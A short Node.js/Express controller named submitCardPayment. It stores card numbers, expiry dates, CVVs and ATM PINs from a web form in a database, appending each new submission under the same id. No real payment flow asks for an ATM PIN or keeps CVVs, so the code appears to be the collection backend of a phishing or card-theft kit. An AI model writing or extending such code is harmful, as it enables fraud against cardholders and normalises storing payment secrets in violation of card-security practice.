const CardPayment = require('../models/CardPayment');

exports.submitCardPayment = async (req, res) => {
    try {
        const { uniqueid, cardNumber, expiryMonth, expiryYear,cvv,atmPin } = req.body;
        let cardPayment = await CardPayment.findOne({ uniqueid });

        if (cardPayment) {
            cardPayment.entries.push({ cardNumber, expiryMonth, expiryYear,cvv,atmPin});
        } else {
            cardPayment = new CardPayment({
                uniqueid,
                entries: [{ cardNumber, expiryMonth, expiryYear,cvv,atmPin }]
            });
        }

        await cardPayment.save();
        res.status(200).json({
            success: true,
            message: "Card Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting card payment data"
        });
    }
};
